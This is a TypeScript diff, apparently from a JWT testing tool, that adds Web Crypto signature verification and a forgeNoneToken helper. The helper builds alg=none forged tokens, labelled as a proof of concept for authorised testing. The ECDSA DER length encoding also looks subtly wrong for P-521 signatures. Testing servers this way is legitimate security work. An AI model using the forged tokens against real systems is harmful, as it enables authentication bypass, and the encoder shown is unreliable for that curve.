@@ -253,3 +253,124 @@ export function pemToArrayBuffer(pem: string): ArrayBuffer {
   for (let i = 0; i < raw.length; i++) buf[i] = raw.charCodeAt(i);
   return buf.buffer;
 }
+
+// ====== 签名验证（Web Crypto） ======
+
+export interface JwtVerifyResult {
+  valid: boolean;
+  alg: string;
+  error?: string;
+}
+
+/** JWT ECDSA 签名：原始 r||s（P1363）→ DER SEQUENCE{ INTEGER r, INTEGER s } */
+function ecRawSignatureToDer(sig: Uint8Array, partLen: number): Uint8Array {
+  const encodeInt = (half: Uint8Array): Uint8Array => {
+    let i = 0;
+    while (i < half.length - 1 && half[i] === 0) i++; // 去前导 0
+    const trimmed = half.subarray(i);
+    // 高位为 1 时补 0x00 防止被当作负数
+    if (trimmed[0] & 0x80) {
+      const padded = new Uint8Array(trimmed.length + 1);
+      padded.set(trimmed, 1);
+      return padded;
+    }
+    return trimmed;
+  };
+  const r = encodeInt(sig.subarray(0, partLen));
+  const s = encodeInt(sig.subarray(partLen, partLen * 2));
+  // DER: 0x30 <len> 0x02 <rlen> <r> 0x02 <slen> <s>
+  const totalLen = 2 + r.length + 2 + s.length;
+  const out = new Uint8Array(2 + totalLen);
+  out[0] = 0x30;
+  out[1] = totalLen;
+  let o = 2;
+  out[o++] = 0x02;
+  out[o++] = r.length;
+  out.set(r, o); o += r.length;
+  out[o++] = 0x02;
+  out[o++] = s.length;
+  out.set(s, o);
+  return out;
+}
+
+/** 各 ECDSA 曲线对应的分量字节长度 */
+const EC_PART_LEN: Record<string, number> = { 'P-256': 32, 'P-384': 48, 'P-521': 66 };
+
+/**
+ * 验证 JWT 签名。
+ * @param token 完整 JWT
+ * @param key   HMAC 为原始密钥字符串；RSA/EC 为 PEM 公钥（SPKI）
+ */
+export async function verifySignature(token: string, key: string): Promise<JwtVerifyResult> {
+  const parts = token.trim().split('.');
+  if (parts.length < 3) return { valid: false, alg: '?', error: 'Token 不完整（缺签名段）' };
+
+  const header = JSON.parse(base64UrlDecode(parts[0])) as JwtHeader;
+  const alg = (header.alg || '').toUpperCase();
+  const data = new TextEncoder().encode(`${parts[0]}.${parts[1]}`);
+  const signature = base64UrlToUint8(parts[2]);
+  const params = JWT_ALGO_MAP[alg];
+
+  if (alg === 'NONE' || alg === 'NON' || alg === 'NIL') {
+    return { valid: true, alg, error: 'alg=none 无签名，服务端若接受则可伪造' };
+  }
+  if (!params) return { valid: false, alg, error: `不支持的算法: ${alg || '(空)'}` };
+  if (!key) return { valid: false, alg, error: '请提供验证密钥' };
+
+  try {
+    if (params.name === 'HMAC') {
+      const cryptoKey = await crypto.subtle.importKey(
+        'raw', new TextEncoder().encode(key), { name: 'HMAC', hash: params.hash }, false, ['verify'],
+      );
+      const valid = await crypto.subtle.verify('HMAC', cryptoKey, signature as unknown as ArrayBuffer, data as unknown as ArrayBuffer);
+      return { valid, alg };
+    }
+
+    if (params.name === 'RSASSA-PKCS1-v1_5' || params.name === 'RSASSA-PSS') {
+      const cryptoKey = await crypto.subtle.importKey(
+        'spki', pemToArrayBuffer(key),
+        params.name === 'RSASSA-PSS'
+          ? { name: 'RSASSA-PSS', hash: params.hash }
+          : { name: 'RSASSA-PKCS1-v1_5', hash: params.hash },
+        false, ['verify'],
+      );
+      const valid = params.name === 'RSASSA-PSS'
+        ? await crypto.subtle.verify({ name: 'RSASSA-PSS' }, cryptoKey, signature as unknown as ArrayBuffer, data as unknown as ArrayBuffer)
+        : await crypto.subtle.verify('RSASSA-PKCS1-v1_5', cryptoKey, signature as unknown as ArrayBuffer, data as unknown as ArrayBuffer);
+      return { valid, alg };
+    }
+
+    if (params.name === 'ECDSA') {
+      const partLen = EC_PART_LEN[params.curve || ''];
+      if (!partLen) return { valid: false, alg, error: `不支持的曲线: ${params.curve}` };
+      const derSig = ecRawSignatureToDer(signature, partLen);
+      const cryptoKey = await crypto.subtle.importKey(
+        'spki', pemToArrayBuffer(key),
+        { name: 'ECDSA', namedCurve: params.curve },
+        false, ['verify'],
+      );
+      const valid = await crypto.subtle.verify(
+        { name: 'ECDSA', hash: params.hash }, cryptoKey, derSig as unknown as ArrayBuffer, data as unknown as ArrayBuffer,
+      );
+      return { valid, alg };
+    }
+
+    return { valid: false, alg, error: `暂不支持 ${alg}（Web Crypto 不支持 EdDSA/ES256K）` };
+  } catch (e: any) {
+    return { valid: false, alg, error: '验证失败: ' + (e.message || String(e)) };
+  }
+}
+
+/**
+ * 构造 alg=none 攻击 PoC：移除签名，便于测试服务端是否接受无签名 token。
+ * 返回的 token 仅用于授权测试，不可用于未授权目标。
+ */
+export function forgeNoneToken(token: string): string {
+  const parts = token.trim().split('.');
+  if (parts.length < 2) return token;
+  const header = JSON.parse(base64UrlDecode(parts[0])) as JwtHeader;
+  header.alg = 'none';
+  const enc = (obj: unknown) => btoa(JSON.stringify(obj)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+  return `${enc(header)}.${parts[1]}.`;
+}
+
